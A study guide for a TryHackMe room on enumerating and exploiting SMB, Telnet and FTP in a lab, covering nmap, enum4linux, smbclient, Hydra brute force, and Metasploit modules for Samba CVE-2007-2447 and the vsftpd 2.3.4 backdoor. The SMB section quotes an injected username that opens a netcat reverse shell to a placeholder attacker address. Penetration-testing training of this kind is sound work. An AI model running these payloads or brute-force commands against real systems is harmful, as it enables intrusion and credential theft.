# Network Services — Full Study Guide

Source module: TryHackMe "Network Exploitation Basics" → Room: Network Services

This room puts the last two rooms into practice: you find open ports with Nmap, then enumerate and (in a controlled lab) exploit three classic, still-extremely-common services: **SMB**, **Telnet**, and **FTP**. The methodology taught here — enumerate deeply before you ever try to exploit — is the single most important habit in this whole module.

---

## 1. The pentesting methodology this room teaches

For every service you encounter, work through the same loop:

1. **Identify** the service and version (Nmap `-sV`, banner grabbing).
2. **Enumerate** — find out everything the service will tell you unauthenticated: shares, users, files, version-specific quirks.
3. **Research** — check the exact version against known CVEs/exploits (searchsploit, Google, Exploit-DB, Metasploit modules).
4. **Exploit** — use a known vulnerability, misconfiguration, or weak/default/brute-forced credentials to gain access.
5. **Document** — note exactly what you did and found (this becomes second nature and matters enormously in real engagements).

---

## 2. SMB (Server Message Block)

### What it is

SMB is a Microsoft protocol for sharing files, printers, and named pipes over a network, and for inter-process communication. On Linux/Unix it's implemented by **Samba**, which is what TryHackMe's lab machines typically run. Ports: **445/TCP** (SMB directly over TCP, modern) and **139/TCP** (SMB over NetBIOS, legacy). Related: NetBIOS uses UDP 137/138 as well.

### Why it matters for security

SMB has an enormous history of critical vulnerabilities (EternalBlue/MS17-010 being the most famous, used in WannaCry), frequently has weak or misconfigured share permissions (e.g. "Everyone" full access, or anonymous/null-session access enabled), and often reveals huge amounts of information about a Windows domain to an unauthenticated user if misconfigured.

### Enumeration

**Nmap:**
```
nmap -p 139,445 -sV -sC <target>
nmap --script smb-os-discovery,smb-enum-shares,smb-enum-users,smb-vuln* -p 445 <target>
```
`smb-os-discovery` reveals the OS/Samba version straight from the banner; `smb-enum-shares` and `smb-enum-users` attempt (often successfully, on misconfigured/legacy boxes) to list shares and users with no credentials — a **null session**.

**enum4linux** — a purpose-built SMB/Samba enumeration script that wraps several lower-level tools:
```
enum4linux -a <target>
```
`-a` runs all checks: OS info, user listing, group/membership info, share listing, password policy, and more. Read the output carefully — usernames it discovers are gold for later brute-forcing.

**smbclient** — an interactive SMB client (works like an FTP client):
```
smbclient -L //<target>/ -N        # -L lists shares, -N = no password (null session)
smbclient //<target>/<sharename> -N
```
Once connected to a share: `ls`, `get <file>`, `put <file>`, `cd <dir>` work as expected.

**smbmap** — quickly shows share names *and* your access level (Read/Write/No access) in one command:
```
smbmap -H <target>
```

### Exploitation

Two common exploitation angles taught here:

1. **Misconfigured shares** — a share with no authentication (or weak credentials) that contains sensitive files (SSH private keys, config files with passwords, etc.) directly readable via `smbclient`/`smbmap`.
2. **Known CVEs in the Samba version itself.** The room's classic example is the **Samba "username map script" vulnerability, CVE-2007-2447**, affecting Samba 3.0.20 through 3.0.25rc3. Samba's `username map script` config option let a malicious username string be passed straight to a shell, allowing arbitrary command execution. It's exploitable via the Metasploit module `exploit/multi/samba/usermap_script`, or manually by connecting as a user whose "username" contains a shell command wrapped in specific syntax (e.g. a name like `/=nc <attacker-ip> <port> -e /bin/sh/`), since the vulnerable version passes that string unsanitized to a system shell.

Metasploit usage pattern (conceptually, since exact syntax depends on the version):
```
msfconsole
use exploit/multi/samba/usermap_script
set RHOSTS <target>
set LHOST <attacker-ip>
run
```
This is a textbook example of *why* version enumeration matters — you don't guess-attack; you identify the exact version, then look up its exact known vulnerabilities.

---

## 3. Telnet

### What it is

Telnet is one of the oldest remote-access protocols — it gives you an interactive command-line session on a remote host, the direct ancestor of SSH. Port: **23/TCP**.

### Why it's dangerous

Telnet transmits **everything in cleartext** — including the username and password used to log in. Anyone able to sniff traffic on the path (or on a shared/hub network, or via ARP spoofing on a switched one) can trivially read credentials straight out of the packet capture. This is exactly why SSH replaced it for anything remotely sensitive; a modern network with Telnet exposed is a serious red flag.

### Enumeration

```
nmap -p 23 -sV -sC <target>
```
The Nmap version scan often grabs the login banner directly, which can leak the OS/distro and sometimes even hints about valid usage. You can also connect manually to see the banner and login prompt yourself:
```
telnet <target> 23
```

### Exploitation

Because Telnet is just "prove you have a password," exploitation is almost always **credential-based**:

- **Try default/weak credentials** manually (`telnet` in, guess `admin:admin`, `root:root`, etc. — surprisingly effective against IoT/embedded gear and lab boxes).
- **Brute-force with Hydra**:
```
hydra -l <username> -P /path/to/wordlist.txt <target> telnet
hydra -L users.txt -P passwords.txt <target> telnet
```
`-l`/`-L` is a single username / username list, `-P` is a password wordlist. Hydra reports any valid combination it finds.
- Once you have valid credentials, `telnet <target>` and log in directly for an interactive shell — no further "exploit" is needed, since a shell is the entire point of Telnet.

---

## 4. FTP (File Transfer Protocol)

### What it is

FTP transfers files between a client and server. It uses **two** channels: a **control** connection on **port 21/TCP** (commands: login, list files, etc.) and a **data** connection for the actual file transfer, which is either **active** mode (server connects back to the client, historically port 20) or **passive** mode (client connects out to a port the server specifies — friendlier to firewalls/NAT, and the modern default).

### Why it's dangerous

Like Telnet, standard FTP sends credentials **in plaintext**. It also frequently allows **anonymous login** — a legitimate, documented FTP feature (username `anonymous`, any/blank password, or `anonymous`/`anonymous`) intended for public file distribution, but very often left enabled unintentionally, exposing files that should be private.

### Enumeration

```
nmap -p 21 -sV -sC --script ftp-anon,ftp-syst <target>
```
`-sV` grabs the exact FTP daemon and version (e.g. "vsftpd 2.3.4," "ProFTPD 1.3.5") — critical, since some FTP daemon versions have catastrophic known backdoors (see below). `ftp-anon` specifically checks whether anonymous login is permitted and, if so, lists the root directory contents right in the Nmap output.

Manual check:
```
ftp <target>
# Username: anonymous
# Password: anonymous  (or blank)
```
If it logs in, you're in — use `ls`, `cd`, `get <file>`, `mget *` to pull down whatever's there, `binary` to switch transfer mode for non-text files.

### Exploitation

Three angles taught in this room:

1. **Anonymous login exposing sensitive files** — sometimes directly containing credentials, private keys, or even a writable directory you can drop a webshell or SSH key into if it's shared with another service.
2. **Brute-forcing weak credentials with Hydra**, same pattern as Telnet:
```
hydra -l <username> -P wordlist.txt <target> ftp
```
3. **Known backdoors in specific FTP daemon versions** — the canonical teaching example is **vsftpd 2.3.4**, which had a maliciously inserted backdoor (not a bug — an intentionally planted backdoor in the source distribution) that opened a root shell on port 6200 if a username ending in a smiley face `:)` was submitted. Exploitable via the Metasploit module `exploit/unix/ftp/vsftpd_234_backdoor`, or by triggering it manually since the backdoor doesn't strictly require valid credentials.

---

## 5. Common thread across all three services

Every service in this room follows the same lesson: **plaintext protocols leak credentials to anyone watching the wire** (Wireshark's "Follow TCP Stream," from the Introductory Networking room, will show you an FTP or Telnet login in cleartext instantly), **default/anonymous access is a constant real-world misconfiguration**, and **exact version numbers matter enormously** because specific versions carry specific, well-documented, sometimes catastrophic vulnerabilities. Nmap's `-sV` and NSE scripts are how you get those version numbers and check for those specific issues efficiently, rather than guessing.

## 6. Quick reference

| Service | Port | Enum tools | Exploitation angle |
|---|---|---|---|
| SMB | 139, 445 | `nmap smb-* scripts`, `enum4linux -a`, `smbclient`, `smbmap` | Misconfigured/open shares; version-specific CVEs (e.g. CVE-2007-2447 usermap_script) |
| Telnet | 23 | `nmap -sV`, manual `telnet` | Default creds; Hydra brute force |
| FTP | 21 (control), 20/passive-range (data) | `nmap ftp-anon`, manual `ftp` | Anonymous login; Hydra brute force; version backdoors (e.g. vsftpd 2.3.4) |

---

## Key takeaways

These three services represent three different failure modes that recur constantly in real networks: SMB shows how a feature-rich protocol leaks information and can carry code-execution bugs in specific versions; Telnet shows the risk of any unencrypted authentication protocol; FTP shows how a legitimate feature (anonymous access) becomes a vulnerability when left on by accident, plus the danger of running unpatched/backdoored software. The workflow — Nmap to find and version-fingerprint, service-specific tools to enumerate, then research-driven exploitation — is the template used again, on different services, in Network Services 2.
